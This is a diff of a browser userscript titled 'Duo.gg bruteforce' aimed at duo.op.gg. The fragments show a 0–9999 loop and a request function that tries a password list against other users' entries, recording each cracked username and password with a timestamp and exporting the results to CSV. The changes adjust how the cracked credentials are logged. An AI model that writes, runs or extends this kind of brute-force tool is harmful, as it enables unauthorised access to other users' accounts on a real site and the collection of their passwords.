@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Duo.gg bruteforce
 // @namespace    https://github.com/HigorJardini/Manhattan-Project/
-// @version      0.9
+// @version      0.10
 // @description  op.gg
 // @author       You
 // @match        *://duo.op.gg/*/lol/
@@ -115,7 +115,7 @@ for (let i = 0; i <= 9999; i++) {
 }
 
 async function downloadCsv(){
-  
+
   $('.opgg-gnb-app').removeAttr('style');
 
   var session = sessionStorage.getItem("deleted_accounts");
@@ -222,9 +222,10 @@ async function httpRequest(id, name) {
       } else if (kboom == true) {
         //console.log('Senhas encontrada: ' + i + '/' + senhas.length + ' - (' + senhas[i] + ', ' + kboom + ') - Usuario: ' + name)
         var obj_deleted = [
-                  id,
+                  //id,
                   name,
-                  senhas[i]
+                  senhas[i],
+                  new Date().toLocaleString('pt-BR', { timeZone: 'UTC' })
                 ]
         await sessionDeletedAccountsSaving(obj_deleted);
 
